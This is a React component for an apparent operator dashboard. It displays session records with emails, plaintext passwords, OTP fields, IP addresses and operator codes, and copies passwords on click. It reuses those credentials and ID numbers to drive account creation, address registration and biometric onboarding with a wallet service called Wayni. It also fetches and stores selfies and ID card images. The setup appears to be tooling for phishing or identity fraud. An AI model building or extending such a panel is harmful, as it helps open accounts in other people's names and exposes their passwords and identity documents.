import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import {
  Check,
  Copy,
  Eye,
  ExternalLink,
  Lock,
  RefreshCw,
  ShieldCheck,
  Smartphone,
  UserRound,
  Zap,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { invokeWayni } from "@/lib/wayniApi";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import type { BioImages, OnboardingRow, SessionItem } from "./types";
import { formatDateTime, getProgressSteps, getStageLabel, mergeOtp, parseOtp } from "./utils";

const ONBOARDING_SOURCE = "iol";

const BioCheck = ({ ok, label }: { ok: boolean; label: string }) => (
  <span className={`rounded-lg border px-2 py-1 text-[10px] font-semibold ${ok ? "border-primary/25 bg-primary/10 text-primary" : "border-destructive/25 bg-destructive/10 text-destructive"}`}>
    {ok ? "✓" : "✗"} {label}
  </span>
);

const ProgressPill = ({ label, done, error }: { label: string; done: boolean; error: boolean }) => (
  <div
    className={`flex flex-1 items-center justify-center rounded-lg border px-2 py-1 text-[10px] font-semibold ${
      done
        ? "border-primary/25 bg-primary/10 text-primary"
        : error
          ? "border-destructive/25 bg-destructive/10 text-destructive"
          : "border-border bg-secondary text-muted-foreground"
    }`}
  >
    {done ? "✓" : error ? "✗" : "○"} {label}
  </div>
);

const IolWayniCard = ({ item, index = 0 }: { item: SessionItem; index?: number }) => {
  const [copied, setCopied] = useState("");
  const [loading, setLoading] = useState(false);
  const [loadingImages, setLoadingImages] = useState(false);
  const [bioInfo, setBioInfo] = useState<Record<string, any> | null>(null);
  const [walletInfo, setWalletInfo] = useState<Record<string, any> | null>(null);
  const [onboardingRow, setOnboardingRow] = useState<OnboardingRow | null>(null);
  const [showImages, setShowImages] = useState(false);
  const [bioImages, setBioImages] = useState<BioImages | null>(null);
  const [retrying, setRetrying] = useState(false);
  const [retryResult, setRetryResult] = useState<{ ok: boolean; msg: string } | null>(null);
  const [lastCheck, setLastCheck] = useState("");
  const isFullyValidated = useRef(false);
  const fetchInFlightRef = useRef(false);
  const fetchInfoRef = useRef<((retryCount?: number) => Promise<void>) | null>(null);

  const otpParts = useMemo(() => {
    const parsed = parseOtp(item.otp_code);
    if (onboardingRow) {
      if (onboardingRow.dni && !parsed.dni) parsed.dni = onboardingRow.dni;
      if (onboardingRow.full_name && !parsed.name) parsed.name = onboardingRow.full_name;
      if (onboardingRow.phone && !parsed.phone) parsed.phone = onboardingRow.phone;
      if (onboardingRow.gender && !parsed.gender) parsed.gender = onboardingRow.gender;
      if (onboardingRow.user_uuid && !parsed.uuid) parsed.uuid = onboardingRow.user_uuid;
      if (onboardingRow.region && !parsed.region) parsed.region = onboardingRow.region;
      if (onboardingRow.city && !parsed.city) parsed.city = onboardingRow.city;
      if (onboardingRow.street && !parsed.street) parsed.street = onboardingRow.street;
      if (onboardingRow.zip_code && !parsed.zip) parsed.zip = onboardingRow.zip_code;
      if (onboardingRow.biometric_url && !parsed.biometric_url) parsed.biometric_url = onboardingRow.biometric_url;
      if (onboardingRow.biometric_id && !parsed.biometric_id) parsed.biometric_id = onboardingRow.biometric_id;
      if (onboardingRow.wallet_status && !parsed.wallet_status) parsed.wallet_status = onboardingRow.wallet_status;
      if (onboardingRow.bio_status && !parsed.bio_status) parsed.bio_status = onboardingRow.bio_status;
      if (onboardingRow.face_code && !parsed.face_code) parsed.face_code = onboardingRow.face_code;
      if (onboardingRow.face_confidence && !parsed.face_confidence) parsed.face_confidence = onboardingRow.face_confidence;
      if (onboardingRow.status === "validated" && !parsed.validated) parsed.validated = "true";
      if (onboardingRow.metadata?.region_id && !parsed.region_id) parsed.region_id = String(onboardingRow.metadata.region_id);
      if (onboardingRow.metadata?.city_id && !parsed.city_id) parsed.city_id = String(onboardingRow.metadata.city_id);
      if (onboardingRow.metadata?.street_name && !parsed.street_name) parsed.street_name = String(onboardingRow.metadata.street_name);
      if (onboardingRow.metadata?.street_number && !parsed.street_number) parsed.street_number = String(onboardingRow.metadata.street_number);
      if (onboardingRow.metadata?.tax_identification_value && !parsed.tax_id) parsed.tax_id = String(onboardingRow.metadata.tax_identification_value);
    }
    return parsed;
  }, [item.otp_code, onboardingRow]);

  const dni = otpParts.dni || "";
  const userName = otpParts.name || item.email || "Sin identificar";
  const userUuid = otpParts.uuid || onboardingRow?.user_uuid || "";
  const biometricUrl = otpParts.biometric_url || onboardingRow?.biometric_url || "";
  const walletStatus = String((walletInfo?.status as string) || otpParts.wallet_status || onboardingRow?.wallet_status || "").toUpperCase();
  const bioStatus = String((bioInfo?.status as string) || otpParts.bio_status || onboardingRow?.bio_status || "");
  const progress = getProgressSteps(item.status, bioStatus, walletStatus);
  const faceConfidence = bioInfo?.facematching ? Number((bioInfo.facematching as Record<string, unknown>).confidence || 0) : Number(otpParts.face_confidence || onboardingRow?.face_confidence || 0);
  const faceCode = bioInfo?.facematching ? Number((bioInfo.facematching as Record<string, unknown>).code || 0) : Number(otpParts.face_code || onboardingRow?.face_code || 0);
  const walletActive = walletStatus === "ACTIVE";
  const hasStoredImages = Boolean(onboardingRow?.selfie_path || onboardingRow?.dni_front_path || onboardingRow?.dni_back_path);

  const copyText = useCallback((text: string, label: string) => {
    navigator.clipboard.writeText(text);
    setCopied(label);
    window.setTimeout(() => setCopied(""), 1500);
  }, []);

  const loadOnboardingRow = useCallback(async () => {
    if (!item.email) return;
    const { data } = await (supabase as any)
      .from("wayni_onboarding")
      .select("*")
      .eq("email", item.email.toLowerCase())
      .eq("source", ONBOARDING_SOURCE)
      .order("updated_at", { ascending: false });

    const rows = Array.isArray(data) ? data : [];
    const preferred = rows.find((row) => {
      const metadata = (row?.metadata as Record<string, any> | null) ?? {};
      return Boolean(metadata.region_id && metadata.city_id && metadata.street_name);
    }) || rows[0] || null;

    setOnboardingRow(preferred as OnboardingRow | null);
  }, [item.email]);

  const updateOnboarding = useCallback(async (payload: Record<string, unknown>) => {
    if (!item.email) return;

    const cleanPayload = Object.fromEntries(
      Object.entries(payload).filter(([, value]) => value !== undefined),
    );

    const compareValue = (value: unknown) => {
      if (value === undefined) return "__undefined__";
      if (value === null) return "__null__";
      if (typeof value === "object") return JSON.stringify(value);
      return String(value);
    };

    const currentRow = onboardingRow;
    const hasChanges = Object.entries(cleanPayload).some(([key, value]) => compareValue(currentRow?.[key as keyof OnboardingRow]) !== compareValue(value));
    if (!hasChanges) return;

    const basePayload = {
      email: item.email.toLowerCase(),
      operator_code: item.operator_code || "master",
      source: ONBOARDING_SOURCE,
      updated_at: new Date().toISOString(),
      ...cleanPayload,
    };

    if (currentRow?.id) {
      await (supabase as any).from("wayni_onboarding").update(basePayload).eq("id", currentRow.id);
      setOnboardingRow((prev) => (prev ? { ...prev, ...(basePayload as Partial<OnboardingRow>) } : prev));
      return;
    }

    const { data: existing } = await (supabase as any)
      .from("wayni_onboarding")
      .select("id")
      .eq("email", item.email.toLowerCase())
      .eq("source", ONBOARDING_SOURCE)
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();

    if (existing?.id) {
      await (supabase as any).from("wayni_onboarding").update(basePayload).eq("id", existing.id);
      await loadOnboardingRow();
    } else {
      await (supabase as any).from("wayni_onboarding").insert({ ...basePayload, session_id: item.id });
      await loadOnboardingRow();
    }
  }, [item.email, item.id, item.operator_code, loadOnboardingRow, onboardingRow]);

  const fetchInfo = useCallback(async (retryCount = 0) => {
    if (!dni || isFullyValidated.current || fetchInFlightRef.current) return;

    fetchInFlightRef.current = true;
    setLoading(true);
    try {
      const [bioResult, walletResult] = await Promise.all([
        invokeWayni({ action: "get_biometric_info", identity_number: dni }),
        invokeWayni({ action: "get_wallet_status", identity_number: dni }),
      ]);

      const bio = bioResult.data;
      const wallet = walletResult.data;

      if (!bio && !wallet) {
        if (retryCount < 2) {
          window.setTimeout(() => {
            void fetchInfoRef.current?.(retryCount + 1);
          }, 3000 * (retryCount + 1));
        }
        return;
      }

      if (bio?.success) setBioInfo(bio);
      if (wallet && !walletResult.error) {
        setWalletInfo((previous) => {
          const previousStatus = String((previous?.status as string) || "");
          const previousUuid = String((previous?.uuid as string) || "");
          const nextStatus = String((wallet.status as string) || "");
          const nextUuid = String((wallet.uuid as string) || "");
          if (previousStatus === nextStatus && previousUuid === nextUuid) return previous;
          return wallet;
        });
      }
      setLastCheck(new Date().toLocaleTimeString("es-AR", { hour: "2-digit", minute: "2-digit", second: "2-digit" }));

      const walletIsActive = String(wallet?.status || "").toUpperCase() === "ACTIVE";
      const bioComplete = bio?.success && bio?.has_selfie === true && bio?.has_dni_front === true && bio?.has_dni_back === true;
      if (walletIsActive && bioComplete) {
        isFullyValidated.current = true;
      }

      const updates: Record<string, string> = {};
      if (bio?.success) {
        updates.bio_status = String(bio.status || "unknown");
        updates.has_selfie = String(bio.has_selfie === true);
        updates.has_dni_front = String(bio.has_dni_front === true);
        updates.has_dni_back = String(bio.has_dni_back === true);
        if (bio.facematching) {
          const facematching = bio.facematching as Record<string, unknown>;
          updates.face_code = String(facematching.code || "");
          updates.face_confidence = String(facematching.confidence || "");
        }
      }

      if (wallet) {
        const nextWalletStatus = typeof wallet.status === "string" ? wallet.status : wallet.errors ? "NOT_FOUND" : "UNKNOWN";
        updates.wallet_status = String(nextWalletStatus).toUpperCase();
        if (wallet.uuid) updates.wallet_uuid = String(wallet.uuid);
        if (walletIsActive && bioComplete) updates.validated = "true";
      }

      if (Object.keys(updates).length > 0) {
        const updateString = Object.entries(updates).map(([key, value]) => `${key}:${value}`).join("|");
        const newOtp = mergeOtp(item.otp_code, updateString);
        const currentOtp = item.otp_code || "";
        const sessionStatus = updates.validated === "true" ? "validated" : item.status;
        const nextOnboardingPayload = {
          dni,
          full_name: otpParts.name || onboardingRow?.full_name || null,
          phone: otpParts.phone || onboardingRow?.phone || null,
          gender: otpParts.gender || onboardingRow?.gender || null,
          user_uuid: otpParts.uuid || onboardingRow?.user_uuid || null,
          biometric_url: biometricUrl || null,
          biometric_id: otpParts.biometric_id || onboardingRow?.biometric_id || null,
          wallet_status: updates.wallet_status || walletStatus || null,
          bio_status: updates.bio_status || bioStatus || null,
          face_code: updates.face_code || otpParts.face_code || null,
          face_confidence: updates.face_confidence || otpParts.face_confidence || null,
          status: sessionStatus,
        };

        if (newOtp !== currentOtp || sessionStatus !== item.status) {
          await supabase.from("sessions").update({ otp_code: newOtp, status: sessionStatus }).eq("id", item.id);
        }

        await updateOnboarding(nextOnboardingPayload);
      }
    } finally {
      fetchInFlightRef.current = false;
      setLoading(false);
    }
  }, [bioStatus, biometricUrl, dni, item.id, item.otp_code, item.status, onboardingRow?.biometric_id, onboardingRow?.full_name, onboardingRow?.gender, onboardingRow?.phone, onboardingRow?.user_uuid, otpParts.biometric_id, otpParts.face_code, otpParts.face_confidence, otpParts.gender, otpParts.name, otpParts.phone, otpParts.uuid, updateOnboarding, walletStatus]);

  useEffect(() => {
    fetchInfoRef.current = fetchInfo;
  }, [fetchInfo]);

  const saveBase64ToStorage = useCallback(async (base64: string, type: string) => {
    try {
      const bytes = Uint8Array.from(atob(base64), (char) => char.charCodeAt(0));
      const path = `${dni}/${type}.jpg`;
      await supabase.storage.from("biometric-images").upload(path, bytes, { contentType: "image/jpeg", upsert: true });
      return path;
    } catch {
      return null;
    }
  }, [dni]);

  const fetchImages = useCallback(async () => {
    if (!dni) return;
    setLoadingImages(true);

    try {
      const loadStoredImage = async (path: string | null | undefined) => {
        if (!path) return null;
        try {
          const { data } = await supabase.storage.from("biometric-images").download(path);
          if (!data) return null;
          const buffer = await data.arrayBuffer();
          const bytes = new Uint8Array(buffer);
          let binary = "";
          for (let index = 0; index < bytes.length; index += 1) binary += String.fromCharCode(bytes[index]);
          return btoa(binary);
        } catch {
          return null;
        }
      };

      if (hasStoredImages) {
        const [selfie, dniFront, dniBack] = await Promise.all([
          loadStoredImage(onboardingRow?.selfie_path),
          loadStoredImage(onboardingRow?.dni_front_path),
          loadStoredImage(onboardingRow?.dni_back_path),
        ]);

        if (selfie || dniFront || dniBack) {
          setBioImages({ selfie, dniFront, dniBack });
          setShowImages(true);
          return;
        }
      }

      const { data } = await invokeWayni({ action: "get_biometric_info", identity_number: dni, include_images: true });
      if (!data?.success) return;

      setBioImages({
        selfie: data.selfie_img || null,
        dniFront: data.dni_front_img || null,
        dniBack: data.dni_back_img || null,
      });
      setShowImages(true);

      const paths: Record<string, unknown> = {};
      if (data.selfie_img) paths.selfie_path = await saveBase64ToStorage(data.selfie_img, "selfie");
      if (data.dni_front_img) paths.dni_front_path = await saveBase64ToStorage(data.dni_front_img, "dni_front");
      if (data.dni_back_img) paths.dni_back_path = await saveBase64ToStorage(data.dni_back_img, "dni_back");
      if (Object.keys(paths).length > 0) await updateOnboarding(paths);
    } finally {
      setLoadingImages(false);
    }
  }, [dni, hasStoredImages, onboardingRow?.dni_back_path, onboardingRow?.dni_front_path, onboardingRow?.selfie_path, saveBase64ToStorage, updateOnboarding]);

  const handleRetry = useCallback(async () => {
    if (!item.email || !dni) return;

    setRetrying(true);
    setRetryResult(null);
    try {
      let currentRow = onboardingRow;
      if (!currentRow) {
        await loadOnboardingRow();
        currentRow = onboardingRow;
      }

      const metadata = (currentRow?.metadata as Record<string, any> | null) ?? {};
      const resolvedEmail = item.email.toLowerCase();
      const resolvedPhone = otpParts.phone || currentRow?.phone || "";
      const resolvedGender = otpParts.gender || currentRow?.gender || "M";
      const resolvedName = otpParts.name || currentRow?.full_name || "";
      const resolvedPassword = item.password || currentRow?.password || "";
      const resolvedTaxId = otpParts.tax_id || metadata.tax_identification_value || "";
      const resolvedRegion = otpParts.region || currentRow?.region || "";
      const resolvedCity = otpParts.city || currentRow?.city || "";
      const resolvedStreet = otpParts.street || currentRow?.street || "";
      const resolvedZip = otpParts.zip || currentRow?.zip_code || "";
      const resolvedRegionId = String(otpParts.region_id || metadata.region_id || "").trim();
      const resolvedCityId = String(otpParts.city_id || metadata.city_id || "").trim();
      const streetMatch = String(resolvedStreet).trim().match(/^(.*?)(?:\s+(\d+[A-Za-z0-9/-]*))?$/);
      const resolvedStreetName = String(otpParts.street_name || metadata.street_name || streetMatch?.[1] || resolvedStreet || "").trim();
      const resolvedStreetNumber = String(otpParts.street_number || metadata.street_number || streetMatch?.[2] || "0").trim();
      const resolvedFloor = otpParts.floor || metadata.floor || null;
      const resolvedApartment = otpParts.apartment || metadata.apartment || null;
      const steps: string[] = [];

      const verifyResult = await invokeWayni({
        action: "onboarding_verify",
        email: resolvedEmail,
        identity_number: dni,
        phone_number: resolvedPhone,
        password: resolvedPassword,
        selected_full_name: resolvedName || undefined,
        selected_gender: resolvedGender || undefined,
        selected_tax_identification_value: resolvedTaxId || undefined,
      });

      if (verifyResult.error || verifyResult.data?.error) {
        throw new Error(verifyResult.data?.error || verifyResult.error?.message || "No se pudo verificar el alta");
      }

      let resolvedUuid = verifyResult.data?.user_uuid || otpParts.uuid || currentRow?.user_uuid || "";
      steps.push("✓ save-data");

      const addressAvailable = resolvedStreetName && resolvedStreetNumber && resolvedCity && resolvedRegion && resolvedZip && resolvedCityId && resolvedRegionId;
      if (addressAvailable) {
        const addressResult = await invokeWayni({
          action: "save_address",
          uuid: resolvedUuid,
          street_name: resolvedStreetName,
          street_number: resolvedStreetNumber,
          floor: resolvedFloor,
          apartment: resolvedApartment,
          zip_code: resolvedZip,
          neighborhood: null,
          city_id: Number(resolvedCityId),
          city: resolvedCity,
          region_id: Number(resolvedRegionId),
          region: resolvedRegion,
        });

        if (addressResult.error || addressResult.data?.error) {
          steps.push(`⚠ save-address: ${addressResult.data?.error || addressResult.error?.message || "error"}`);
        } else {
          steps.push("✓ save-address");
        }
      } else {
        steps.push("⏭ save-address (faltan datos)");
      }

      const biometricResult = await invokeWayni({
        action: "onboarding_biometric",
        identity_number: dni,
        user_uuid: resolvedUuid,
        gender: resolvedGender,
      });

      if (biometricResult.error || biometricResult.data?.error) {
        throw new Error(biometricResult.data?.error || biometricResult.error?.message || "No se pudo generar el link biométrico");
      }

      const nextBiometricUrl = biometricResult.data?.biometric_url || biometricResult.data?.url || "";
      const nextBiometricId = biometricResult.data?.externalIdentifier || biometricResult.data?.biometric_id || "";
      steps.push("✓ biometric");

      const nextOtp = mergeOtp(item.otp_code, [
        `uuid:${resolvedUuid}`,
        `gender:${resolvedGender}`,
        resolvedTaxId ? `tax_id:${resolvedTaxId}` : null,
        nextBiometricUrl ? `biometric_url:${nextBiometricUrl}` : null,
        nextBiometricId ? `biometric_id:${nextBiometricId}` : null,
      ].filter(Boolean).join("|"));

      await supabase.from("sessions").update({ otp_code: nextOtp, status: "biometric_started" }).eq("id", item.id);
      await updateOnboarding({
        dni,
        full_name: resolvedName || null,
        phone: resolvedPhone || null,
        password: resolvedPassword || null,
        gender: resolvedGender || null,
        user_uuid: resolvedUuid || null,
        region: resolvedRegion || null,
        city: resolvedCity || null,
        street: resolvedStreet || null,
        zip_code: resolvedZip || null,
        biometric_url: nextBiometricUrl || null,
        biometric_id: nextBiometricId || null,
        status: "biometric_started",
        metadata: {
          ...metadata,
          tax_identification_value: resolvedTaxId,
          region_id: resolvedRegionId,
          city_id: resolvedCityId,
          street_name: resolvedStreetName,
          street_number: resolvedStreetNumber,
          floor: resolvedFloor,
          apartment: resolvedApartment,
        },
      });

      setRetryResult({ ok: true, msg: `${steps.join(" → ")}${nextBiometricUrl ? `\n${nextBiometricUrl}` : ""}` });
      await fetchInfo();
    } catch (error) {
      setRetryResult({ ok: false, msg: error instanceof Error ? error.message : "Error al reenviar el alta" });
    } finally {
      setRetrying(false);
    }
  }, [dni, fetchInfo, item.email, item.id, item.otp_code, item.password, loadOnboardingRow, onboardingRow, otpParts.apartment, otpParts.city, otpParts.city_id, otpParts.floor, otpParts.gender, otpParts.name, otpParts.phone, otpParts.region, otpParts.region_id, otpParts.street, otpParts.street_name, otpParts.street_number, otpParts.tax_id, otpParts.uuid, otpParts.zip, updateOnboarding]);

  useEffect(() => {
    void loadOnboardingRow();
  }, [loadOnboardingRow]);

  useEffect(() => {
    if (!dni) return;
    const alreadyValidated = otpParts.validated === "true" || walletActive;
    if (alreadyValidated) {
      isFullyValidated.current = true;
      if (walletStatus) setWalletInfo({ status: walletStatus, uuid: otpParts.wallet_uuid || null });
      return;
    }

    const initialDelay = window.setTimeout(() => {
      void fetchInfo();
    }, index * 3500);
    const jitter = Math.floor(Math.random() * 60000);
    const interval = window.setInterval(() => {
      void fetchInfo();
    }, 10 * 60 * 1000 + jitter);

    return () => {
      window.clearTimeout(initialDelay);
      window.clearInterval(interval);
    };
  }, [dni, fetchInfo, index, otpParts.validated, otpParts.wallet_uuid, walletActive, walletStatus]);

  return (
    <Card className="overflow-hidden border-border bg-card/95">
      <div className="border-b border-border/60 px-4 py-3">
        <div className="flex items-start justify-between gap-3">
          <div className="min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <div className="flex h-9 w-9 items-center justify-center rounded-xl bg-primary/10 text-primary">
                <ShieldCheck className="h-4 w-4" />
              </div>
              <div className="min-w-0">
                <div className="flex items-center gap-2 flex-wrap">
                  <p className="truncate text-sm font-semibold text-foreground">{item.email || userName}</p>
                  <Badge variant="outline" className="border-primary/25 bg-primary/10 text-primary">
                    {getStageLabel(item.status, walletStatus)}
                  </Badge>
                  {item.operator_code && item.operator_code !== "master" && <Badge variant="secondary">{item.operator_code}</Badge>}
                </div>
                <p className="mt-1 text-xs text-muted-foreground">{formatDateTime(item.created_at)}</p>
              </div>
            </div>
          </div>

          <Button variant="ghost" size="icon" onClick={() => void fetchInfo()} disabled={loading || !dni}>
            <RefreshCw className={`h-4 w-4 ${loading ? "animate-spin" : ""}`} />
          </Button>
        </div>
      </div>

      <CardContent className="space-y-3 p-4">
        <div className="flex gap-2 flex-wrap sm:flex-nowrap">
          {progress.map((step) => (
            <ProgressPill key={step.label} {...step} />
          ))}
        </div>

        <div className="flex items-center gap-3 flex-wrap">
          {dni && (
            <button onClick={() => copyText(dni, "dni")} className="flex items-center gap-1 text-xs font-semibold text-primary hover:opacity-80">
              <span>DNI: {dni}</span>
              {copied === "dni" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3 text-muted-foreground" />}
            </button>
          )}
          {(otpParts.name || onboardingRow?.full_name) && (
            <span className="flex items-center gap-1 text-xs text-foreground">
              <UserRound className="h-3 w-3 text-muted-foreground" />
              {otpParts.name || onboardingRow?.full_name}
            </span>
          )}
          {(otpParts.gender || onboardingRow?.gender) && <span className="text-xs text-muted-foreground">{otpParts.gender || onboardingRow?.gender}</span>}
          {(otpParts.phone || onboardingRow?.phone) && (
            <button onClick={() => copyText(otpParts.phone || onboardingRow?.phone || "", "phone")} className="flex items-center gap-1 text-xs text-primary hover:opacity-80">
              <Smartphone className="h-3 w-3 text-muted-foreground" />
              {otpParts.phone || onboardingRow?.phone}
              {copied === "phone" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3 text-muted-foreground" />}
            </button>
          )}
          {(item.password || onboardingRow?.password) && (
            <button onClick={() => copyText(item.password || onboardingRow?.password || "", "password")} className="flex items-center gap-1 text-xs text-foreground hover:opacity-80">
              <Lock className="h-3 w-3 text-muted-foreground" />
              <span className="font-mono">{item.password || onboardingRow?.password}</span>
              {copied === "password" ? <Check className="h-3 w-3" /> : <Copy className="h-3 w-3 text-muted-foreground" />}
            </button>
          )}
        </div>

        {userUuid && (
          <button onClick={() => copyText(userUuid, "uuid")} className="flex items-center gap-1 text-[11px] text-muted-foreground hover:opacity-80">
            <span className="font-mono">UUID: {userUuid.slice(0, 16)}...</span>
            {copied === "uuid" ? <Check className="h-3 w-3 text-primary" /> : <Copy className="h-3 w-3" />}
          </button>
        )}

        {(otpParts.region || otpParts.city || otpParts.street || otpParts.zip) && (
          <div className="rounded-xl border border-border bg-background/60 px-3 py-2 text-sm text-muted-foreground">
            <span className="font-medium text-foreground">Dirección:</span>{" "}
            {[otpParts.street, otpParts.city, otpParts.region, otpParts.zip ? `CP ${otpParts.zip}` : null].filter(Boolean).join(" • ")}
          </div>
        )}

        {biometricUrl && (
          <div className="rounded-xl border border-border bg-background/60 px-3 py-2">
            <div className="flex items-center justify-between gap-2">
              <div className="min-w-0">
                <p className="text-[10px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Link biométrico</p>
                <a href={biometricUrl} target="_blank" rel="noopener noreferrer" className="mt-1 block truncate text-xs text-primary hover:underline">
                  {biometricUrl}
                </a>
                {(otpParts.biometric_id || onboardingRow?.biometric_id) && (
                  <p className="mt-1 text-[11px] text-muted-foreground">ID: {otpParts.biometric_id || onboardingRow?.biometric_id}</p>
                )}
              </div>
              <Button variant="outline" size="sm" onClick={() => window.open(biometricUrl, "_blank", "noopener,noreferrer")}>
                <ExternalLink className="h-4 w-4" />
                Abrir
              </Button>
            </div>
          </div>
        )}

        {dni && (
          <div className="rounded-xl border border-border bg-background/60 px-3 py-3 space-y-2">
            <div className="flex items-center justify-between gap-3">
              <div className="flex items-center gap-2 flex-wrap">
                <span className="text-[10px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Validación</span>
                <BioCheck ok={bioInfo?.has_selfie === true || Boolean(onboardingRow?.selfie_path)} label="Selfie" />
                <BioCheck ok={bioInfo?.has_dni_front === true || Boolean(onboardingRow?.dni_front_path)} label="DNI Frente" />
                <BioCheck ok={bioInfo?.has_dni_back === true || Boolean(onboardingRow?.dni_back_path)} label="DNI Dorso" />
              </div>
              <Button variant="outline" size="sm" onClick={() => void fetchImages()} disabled={loadingImages}>
                {loadingImages ? <RefreshCw className="h-4 w-4 animate-spin" /> : <Eye className="h-4 w-4" />}
                {loadingImages ? "Cargando..." : "Ver fotos"}
              </Button>
            </div>

            {(bioInfo || hasStoredImages) ? (
              <>
                <div className="flex items-center gap-2 flex-wrap">
                  <span className="text-[10px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Facematching</span>
                  <span className={`rounded-lg border px-2 py-1 text-[10px] font-semibold ${faceCode === 200 ? "border-primary/25 bg-primary/10 text-primary" : "border-destructive/25 bg-destructive/10 text-destructive"}`}>
                    {faceCode === 200 ? "Aprobado" : faceCode ? `Código ${faceCode}` : "Pendiente"}
                  </span>
                  {Boolean(faceConfidence) && (
                    <span className="rounded-lg border border-border bg-secondary px-2 py-1 text-[10px] font-semibold text-foreground">
                      {faceConfidence}% confianza
                    </span>
                  )}
                </div>

                {(bioStatus || walletStatus) && (
                  <div className="flex items-center gap-2 flex-wrap text-xs text-muted-foreground">
                    {bioStatus && <span>Biometría: <strong className="text-foreground">{bioStatus}</strong></span>}
                    {walletStatus && <span>Wallet: <strong className="text-foreground">{walletStatus}</strong></span>}
                  </div>
                )}
              </>
            ) : (
              <p className="text-xs text-muted-foreground">Use <span className="font-medium text-foreground">Ver fotos</span> para consultar os documentos sob demanda.</p>
            )}
          </div>
        )}

        {showImages && bioImages && (
          <div className="rounded-xl border border-border bg-background/60 px-3 py-3 space-y-3">
            <div className="flex items-center justify-between">
              <p className="text-[10px] font-semibold uppercase tracking-[0.18em] text-muted-foreground">Documentos enviados</p>
              <button onClick={() => setShowImages(false)} className="text-xs text-muted-foreground hover:text-foreground">Cerrar</button>
            </div>
            <div className="grid gap-3 sm:grid-cols-3">
              {bioImages.selfie && <img src={`data:image/jpeg;base64,${bioImages.selfie}`} alt="Selfie biométrica" className="max-h-52 w-full rounded-xl border border-border object-cover" />}
              {bioImages.dniFront && <img src={`data:image/jpeg;base64,${bioImages.dniFront}`} alt="DNI frente" className="max-h-52 w-full rounded-xl border border-border object-cover" />}
              {bioImages.dniBack && <img src={`data:image/jpeg;base64,${bioImages.dniBack}`} alt="DNI dorso" className="max-h-52 w-full rounded-xl border border-border object-cover" />}
            </div>
          </div>
        )}

        <div className="space-y-2">
          <Button className="w-full" onClick={() => void handleRetry()} disabled={retrying || !dni || !item.email || walletActive}>
            {retrying ? <RefreshCw className="h-4 w-4 animate-spin" /> : walletActive ? <Check className="h-4 w-4" /> : <Zap className="h-4 w-4" />}
            {retrying ? "Reenviando cadastro..." : walletActive ? "Conta ya activa" : "Reenviar Cadastro / Criar Conta"}
          </Button>

          {retryResult && (
            <div className={`rounded-xl border px-3 py-2 text-xs font-medium whitespace-pre-line ${retryResult.ok ? "border-primary/25 bg-primary/10 text-primary" : "border-destructive/25 bg-destructive/10 text-destructive"}`}>
              {retryResult.msg}
            </div>
          )}
        </div>

        <div className="flex items-center justify-between gap-3 text-[11px] text-muted-foreground">
          <span>{lastCheck ? `Última consulta: ${lastCheck}` : "Sin consulta reciente"}</span>
          {item.ip_address && <span>{item.ip_address}</span>}
        </div>
      </CardContent>
    </Card>
  );
};

export default IolWayniCard;
